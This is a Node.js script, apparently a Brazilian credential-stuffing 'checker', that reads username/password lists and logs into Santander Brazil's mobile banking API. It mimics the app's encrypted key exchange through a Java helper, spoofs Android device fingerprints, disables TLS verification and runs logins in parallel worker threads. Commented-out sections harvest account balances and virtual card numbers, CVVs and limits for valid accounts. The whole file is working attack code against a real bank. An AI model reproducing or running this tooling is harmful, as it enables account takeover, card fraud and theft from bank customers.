const fs = require('fs');
const readline = require('readline');
const { Worker, WorkerData } = require('worker_threads');
var vir = require('./Virtual.js').vir;
//import vir from './Virtual.js';
var execSync = require('child_process').execSync, child;
request = require("request");
var unirest = require('unirest');
var axios = require('axios');
const https = require('https');

process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;

var creditos = "Feito por thequeen, fornecido pro charlão";
let f23050c = null;

const args = process.argv.slice(2);

var fileName = args[0];
if (fileName != undefined) {
    //console.log('fileName', fileName);
    fs.open(fileName, 'r', function(err, fd) {
        if (err == null) {
            const fileStream = fs.createReadStream(fileName);
            var lista = [];
            const rl = readline.createInterface({
                input: fileStream,
                crlfDelay: Infinity
            });
    
            rl.on('line', function (line) {
                //console.log('Line from file: ', line);
                lista.push(line);
            })
            .on('close', function(line) {
                //console.log("number of lines ", lista.length);
                if(lista.length % 11 == 0) {
    
                } else if (lista.length % 10 == 0) {
                    
                } else if (lista.length % 9 == 0) {
                    
                } else if (lista.length % 8 == 0) {
                    
                } else if (lista.length % 7 == 0) {
                    
                } else if (lista.length % 6 == 0) {
                    
                } else if (lista.length % 5 == 0) {
                    
                } else if (lista.length % 4 == 0) {
                    
                } else {
                    despacharThread(lista, 1);
                } 
            });
        } else {
            console.log('Desculpe certifique-se de que o arquivo existe');
        }
    });
}

const runThread = (subList) => {
    return new Promise((resolve, reject) => {
        const worker = new Worker('./thequeen/MyThread.js', { workerData: subList });
        worker.once('message', result => {
            console.log('message', result);
        });
        worker.on('error', err => {
            console.log(err);
        });
        worker.on('exit', (code) => {
            if (code != 0)
                reject(new Error(`stopped with ${code} exit code`));
        })
    });
}

const despacharThread = async (lista, num) => {
    var comeco = 0;
    var fatia = lista.length / num;
    //console.log('lista.length', lista.length);
    for(var i = 0 ; i < num; i++) {
        const result = await runThread(lista.slice(comeco, comeco + fatia));
        comeco += fatia;
    }
}

  class userLoginPayload {
    constructor() {
      this.documentNumber = null;
      this.appVersion = null;
      this.appVersionCode = null;
      this.deviceSystemName = null;
    }
  }

function getAlphaNumericString(n) {
    const alphaString = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvxyz';
    let sb = [];
    for(let i = 0 ;i < n ; i++) {
        let index = alphaString.length * Math.random();
        sb.push(alphaString.charAt(index));
    }
    return sb;
}

function transmitCard(ex, token, v) {
    let cards = v.puxarCartoes();
    let retorno = "";
    cards.forEach(vv => {
        if (vv['hasVirtualCard']) {
            try {
                let a = v.gerarVirtual(v.index,f23050c);
                let data = JSON.parse(a);
                if (a.indexOf('3333333333333333') == -1) {
                    let stdout = execSync('java -jar app.jar mo12438a ' + data['cvv'] + ' ' + f23050c);
                    data['cvv'] = stdout.toString();
                    console.log('data.cvv', data['cvv']);
                    let cc = "NUMERO: " + data['cardNumber'] + " | VALIDADE: " + data['dueDate'] + " | CVV: " + data['cvv'] + " | NOME: " + data['ownerName'] + " | LIMITE DISPONIVEL: " + v.limites(cartao.lastDigits) + "\n";
                    retorno += cc;
                }
            } catch (e) {

            }
        }
    })
    return retorno;
}

const login = async (username, password, action, index, loginResultProcess) => {
    let pubKey = null;
    let privKey = null;
    let stdout = null;
    stdout = execSync('java -jar app.jar mo12430e');
    stdout = stdout.toString();
    stdout = stdout.replace(/[\n\r]/g, '');
    //console.log('stdout', stdout);

    pubKey = stdout.split(',')[0];
    //pubKey = '308201a63082011b06092a864886f70d0103013082010c02818100836b7312c632a508fa80a880746410f76e2180b786717987bc23984e46318521757096878d92117d5ba66fe646c37df4dd66b2752b04a87210f49c6f4d73e28b2f9c145e93b4dd6e1922c421b6ffbb820b6f52d6f65b0aad81f54eede7ba9a00d2912f9c29d46e49dc93a7faca726f7b71f52c7656db5266bc5c78cc8fc56c6d0281810092b71f49aff2bf799426dda77161eb88ebc2649da78802190d37e42576e2994a0b0fd5add2d2f866627f631e86ffd461ebcdf4095fba38bb7a36de48b381dec3584dfbb86e3d35aa0a145deb0064eb50be6b2ee0dfba6fee3501272f4d6ce3ef09521c8226ca0b9493c34ef19614089e6653cfdb7794881648788e1aa866abfd02020200038184000281801c47f8f1e7ea1ba6bc9aab415ca68975ca3f20e511f2b3475750835c4722516213d8a3230bbdd4c239f36515d684160bf52a70d0a30dbc1e27b01b0dbba02cd0514233945bbd58ccbfc8e7d2f4c2b0751e8675189559ead0e5491b6da35fd6e568fbbe5cd240c637986303ea011ef4c2674e6430798b4442bc9beca88d8c1acb';
    privKey = stdout.split(',')[1];
    //privKey = 'MIIBZwIBADCCARsGCSqGSIb3DQEDATCCAQwCgYEAg2tzEsYypQj6gKiAdGQQ924hgLeGcXmHvCOYTkYxhSF1cJaHjZIRfVumb+ZGw3303WaydSsEqHIQ9JxvTXPiiy+cFF6TtN1uGSLEIbb/u4ILb1LW9lsKrYH1Tu3nupoA0pEvnCnUbknck6f6ynJve3H1LHZW21JmvFx4zI/FbG0CgYEAkrcfSa/yv3mUJt2ncWHriOvCZJ2niAIZDTfkJXbimUoLD9Wt0tL4ZmJ/Yx6G/9Rh6830CV+6OLt6Nt5Is4Hew1hN+7huPTWqChRd6wBk61C+ay7g37pv7jUBJy9NbOPvCVIcgibKC5STw07xlhQInmZTz9t3lIgWSHiOGqhmq/0CAgIABEMCQQDakGNaTv9ew5lVdn01Z23BUD/vjgZyZGubCijqMKhxtASj/UOmRgM2j2Auj2velsacSyWl30O6t8fa8lbiljk+';
    console.log('pubkey', pubKey);
    console.log('privkey', privKey);
    let nonce = null;
    let serverDLBv1 = null;

    await unirest
    .post('https://m.santander.com.br/key-exchange/v1/exchange')
    .strictSSL(false)
    .headers({'Accept': 'application/json', 'Content-Type': 'application/json'})
    .send({ "dlbClientKey": pubKey})
    .then((response) => {
        //console.log('response', response.body);
        nonce = response.body["nonce"];
        //nonce = '7quP7TSzW+UnRyU8ImC80ZOa36RjzEMor0iNHbJZACgK5LmeZR8hY/VVBZcQ4b8UyA02vBF38+F+RCgtXS7zzfvBH78VQ55Fe2XkpkXrQfjqtFOzEr7IlCXsfugIFNniFJgt2w70KtPAy+m5OS/y4vRRHoXErFM+vzqoDsJ/rNaQCx4epR4ti6UM3mH2KGzgSK1HU16rLGtpLfNqF3h5gjsNtP6oDjwB4z9N/l/LDpu2qFPTdiKmgKLo5PGnYchY';
        serverDLBv1 = response.body["serverDLBv1"];
        //serverDLBv1 = '308201A63082011B06092A864886F70D0103013082010C02818100836B7312C632A508FA80A880746410F76E2180B786717987BC23984E46318521757096878D92117D5BA66FE646C37DF4DD66B2752B04A87210F49C6F4D73E28B2F9C145E93B4DD6E1922C421B6FFBB820B6F52D6F65B0AAD81F54EEDE7BA9A00D2912F9C29D46E49DC93A7FACA726F7B71F52C7656DB5266BC5C78CC8FC56C6D0281810092B71F49AFF2BF799426DDA77161EB88EBC2649DA78802190D37E42576E2994A0B0FD5ADD2D2F866627F631E86FFD461EBCDF4095FBA38BB7A36DE48B381DEC3584DFBB86E3D35AA0A145DEB0064EB50BE6B2EE0DFBA6FEE3501272F4D6CE3EF09521C8226CA0B9493C34EF19614089E6653CFDB7794881648788E1AA866ABFD02020200038184000281805C38A9FBE9C9C18A9FD17160FEE22CF0A1400679D63A77ACB54ABF03613D5FEF91244BB73A39BDAA16C2272FA48BBC96B8BAB7FA08806E7C5713DCBD5332A2B6237FA23F48C713E916E19AC63238283BE78AC44C9FB6B87665185493FCAC2DFA6838B290C099E6876238219E16BDB31B93C43DD5131DE8F8D08DE80BF31577B0';
        console.log('status0', response.status);
        console.log('nonce', nonce);
        console.log('serverDLv1', serverDLBv1);
    })
    .catch(err => {
        console.log(err);
        loginResultProcess(++index, username, "error");
    })

    stdout = execSync('java -jar app.jar mo12427f ' + serverDLBv1 + ' ' + privKey);
    stdout = stdout.toString();
    stdout = stdout.replace(/[\n\r]/g, '');
    console.log('stdout0', stdout);
    f23050c = stdout;

    stdout = execSync('java -jar app.jar mo12438a ' + nonce + ' ' + f23050c);
    stdout = stdout.toString();
    stdout = stdout.replace(/[\n\r]/g, '');
    console.log('stdout1', stdout);
    let exchangeDecrypted = stdout;
    console.log('exchangeDecrypted', exchangeDecrypted);
    let ex = JSON.parse(exchangeDecrypted);
    let userPayload = new userLoginPayload();
    userPayload.appVersion = "12.8.0.0";
    userPayload.appVersionCode = "100221";
    userPayload.deviceSystemName = "ANDROID";
    userPayload.documentNumber = username;
    console.log('username', username);
    let userPayloadJSON = JSON.stringify(userPayload);
    //console.log('userPayloadJSON', userPayloadJSON);
    stdout = execSync('java -jar app.jar mo12433c ' + userPayloadJSON.toString() + ' ' + f23050c);
    let body = stdout.toString();
    body = body.replace(/[\n\r]/g, '');

    let authoriza = execSync('java -jar app.jar base64encode ' + ex['contextId'] + ":" + ex['token']).toString();
    console.log('authorization', authoriza);
    //console.log('userPayloadJON String', userPayloadJSON.toString());
    
    console.log('stdout2', body);
    let token = null;

    var headerObj = {
        'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authoriza,
        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
        'versao-mbb' : '12.1.0.0',
        'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'
    };
    var req = https.request({
        host: 'm.santander.com.br',
        port: 443,
        path: '/settings/v1/check',
        method: 'POST',
        headers: headerObj
    }, (res) => {
        console.log('statusCode', res.statusCode);
    });
    req.write(body);
    req.end();
    return;
    await unirest
        .post("https://m.santander.com.br/settings/v1/check")
        .strictSSL(false)
        .headers(headerObj)
        .send(body)
        .then((response) => {
            token = response.headers['access-token'];
            //console.log('responsebody', response);
            console.log('status1', response.status);            //console.log('header', response.headers);
        })        

        return;
    let tokenb = Buffer.from(token, 'base64');
    let token2 = tokenb.toString();
    let ts = Date.now();
    let token3 = null;
    let response3 = null;
    authorization = Buffer.from(ex['contextId'] + ":" + token2);
    stdout = execSync('java -jar app.jar mo12433c ' + '{\"deviceId\":\"' + getAlphaNumericString(43) + '\",\"lastPasswordChangeDate\":\"\",\"deviceInfo\":{\"CellTowerId\":\"47108\",\"DeviceSystemVersion\":\"31\",\"SDK_VERSION\":\"3.6.0\",\"DeviceName\":\"null\",\"WiFiMacAddress\":\"02:00:00:00:00:00\",\"RSA_ApplicationKey\":\"null\",\"Emulator\":0,\"MNC\":\"260\",\"LocationAreaCode\":\"8514\",\"PhoneNumber\":\"-1\",\"OS_ID\":\"null\",\"MultitaskingSupported\":true,\"Languages\":\"en\",\"DeviceModel\":\"SAMSUNG\",\"GeoLocationInfo\":[{\"Status\":\"0\",\"Timestamp\":\"' + ts.toString() + '\",\"Latitude\":\"0\",\"Longitude\":\"1\"}],\"DeviceSystemName\":\"Android\",\"Compromised\":0,\"ScreenSize\":\"1080x1794\",\"WiFiNetworksData\":{\"Channel\":\"null\",\"SignalStrength\":\"-50\"},\"MCC\":\"310\",\"SIM_ID\":\"-1\",\"HardwareID\":\"null\"}}' + ' ' + f23050c);
    body = stdout.toString();
    body = body.replace(/[\n\r]/g, '');
    //console.log('stdout0', body);
    try {
        await unirest
            .post('https://m.santander.com.br/user/v1/check')
            .strictSSL(false)
            .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization.toString('base64'),
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
                'versao-mbb' : '12.1.0.0',
                'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
            .send(body)
            .then((response) => {
                response3 = response;
                token3 = response.headers['access-token'];
                console.log('status2', response.status);
                //console.log('token3', token3);
            })

        let tokenb2 = Buffer.from(token3, 'base64');
        let token4 = tokenb2.toString();
        let token5 = null;
        let response4 = null;
        //console.log('password', password);
        stdout = execSync('java -jar app.jar mo12433c_senha ' + password + ' ' + f23050c);
        let body1 = stdout.toString();
        body1 = body1.replace(/[\n\r]/g, '');
        //console.log('stdout1', body1);
        
       // console.log('authorization0',ex['contextId'] + ":" + token4);
        authorization = Buffer.from(ex['contextId'] + ":" + token4);
        let tmp = '{\"password\":\"' + body1 + '\",\"touchIdIntent\":\"none\",\"deviceInfo\":{\"HardwareID\":\"' + getAlphaNumericString(43) + '\",\"SIM_ID\":\"-1\",\"PhoneNumber\":\"-1\",\"GeoLocationInfo\":[{\"Longitude\":\"0\",\"Latitude\":\"0\",\"HorizontalAccuracy\":\"5\",\"Altitude\":\"5\",\"AltitudeAccuracy\":\"5\",\"Timestamp\":\"' + ts.toString() + '\",\"Heading\":\"0\",\"Speed\":\"0\",\"Status\":\"0\"}],\"DeviceModel\":\"SAMSUNG\",\"MultitaskingSupported\":true,\"DeviceName\":\"SAMSUNG\",\"DeviceSystemName\":\"Android\",\"DeviceSystemVersion\":\"31\",\"Languages\":\"en\",\"WiFiMacAddress\":\"02:00:00:00:00:00\",\"WiFiNetworksData\":{\"BBSID\":\"00:13:10:85:fe:01\",\"SignalStrength\":\"-50\",\"Channel\":\"null\",\"SSID\":\"AndroidWifi\"},\"CellTowerId\":\"0\",\"LocationAreaCode\":\"0\",\"ScreenSize\":\"1080x1794\",\"RSA_ApplicationKey\":\"' + getAlphaNumericString(32) + '\",\"MCC\":\"0\",\"MNC\":\"0\",\"OS_ID\":\"null\",\"SDK_VERSION\":\"3.6.0\",\"Compromised\":0,\"Emulator\":0,\"FrontCameraAvailable\":false},\"santanderIdEnabled\":false,\"sddData\":\"\"}';
        //console.log('tmp', tmp);

        stdout = execSync('java -jar app.jar mo12433c ' + tmp + ' ' + f23050c);
        body = stdout.toString();
        body = body.replace(/[\n\r]/g, '');
        //console.log('stdout2', body);
        let responseBody = null;

        try {
            await unirest
            .post('https://m.santander.com.br/user-auth/v1/authenticate')
            .strictSSL(false)
            .headers({'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization' : authorization.toString('base64'),
                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 12; sdk_gphone64_arm64 Build/SE1A.211012.001)',
                'versao-mbb' : '12.1.0.0',
                'x-info-user' : '8eca3c61b1a7565ca88cf5a928626dfebb6de49cb346a3307ad1c14177439c92'})
            .send(body)
            .then((response) => {
                //console.log('response.headers', response.headers);
                //console.log('reaponse.body', response.body);
                token5 = response.headers['access-token'];
               // console.log('token5', token5);
               responseBody = response.body;
               console.log('status3', response.status);
               let loginResultBody = execSync('java -jar app.jar mo12438a ' + responseBody + ' ' + f23050c);
               console.log('loginResultBody', loginResultBody.toString());
                response4 = response;
            })

            if (token5 != null && token5 != undefined)
                loginResultProcess(++index, username,'success');
            else
                loginResultProcess(++index, username,'failed');
            /*
            let tokenb3 = Buffer.from(token5, 'base64');
            let token6 = tokenb3.toString();

            let v = new vir(ex, token6);   

            console.log('v', v);
            let puxarSaldo = await v.puxarSaldo(f23050c);
            
            console.log('puxarSaldo', puxarSaldo);

            stdout = execSync('java -jar app.jar mo12438a ' + puxarSaldo + ' ' + f23050c);
            let saldoJsontext = stdout.toString();
            saldoJsontext = saldoJsontext.replace(/[\n\r]/g, '');
            console.log('saldoJsontext', saldoJsontext);

            let saldo = JSON.parse(saldoJsontext);
            let cards = transmitCard(ex, token6, v);

            stdout = execSync('java -jar app.jar mo12438a ' + response4.body + ' ' + f23050c);
            let myjson = stdout.toString();
            myjson = myjson.replace(/[\n\r]/g, '');
            console.log('myjson', myjson);
            let liveObj = JSON.parse(myjson);
            loginResultProcess(action, cards + "LIVE|" + liveObj['santanderIdEnabling']['action'] + "  SALDO + CHEQUE ESPECIAL: " + saldo['accountBalances'][0]['availableBalancePlusOverdraft']);
            */
        } catch (e) {
            //console.log('error', e);
            loginResultProcess(username, 'failed');
            /*stdout = execSync('java -jar app.jar mo12438a ' + response3.body + ' ' + f23050c);
            let myjson2 = stdout.toString();
            myjson2 = myjson2.replace(/[\n\r]/g, '');
            console.log('myjson2', myjson2);
            let dieObj = JSON.parse(myjson2);
            loginResultProcess(action, "DIE|" + dieObj['message']);*/
        }
    }catch (e) {
        return login(username, password);
    }
}

module.exports = { login };